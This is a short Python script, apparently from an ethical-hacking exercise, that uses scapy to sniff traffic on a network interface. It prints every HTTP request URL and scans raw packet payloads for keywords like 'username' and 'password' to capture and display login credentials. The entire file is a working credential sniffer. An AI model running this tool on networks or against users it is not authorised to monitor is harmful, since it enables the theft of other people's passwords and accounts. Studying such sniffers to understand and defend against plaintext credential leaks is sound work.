import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packetd)

def get_url(packet):
    return  packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword.encode() in load:
                return load
                


def process_sniffed_packetd(packet): #muestra por consola los paquetes que fluyen
    if packet.haslayer(http.HTTPRequest): #Solo mostramos los paquetes HTTP
        url = get_url(packet)
        print('[+] HTTP Request: ' + str(url))

        login_info = get_login_info(packet)
        if login_info:
            print('\n\n[+] Usuario y contraseña: ' + str(login_info) )
                
sniff("enp4s0")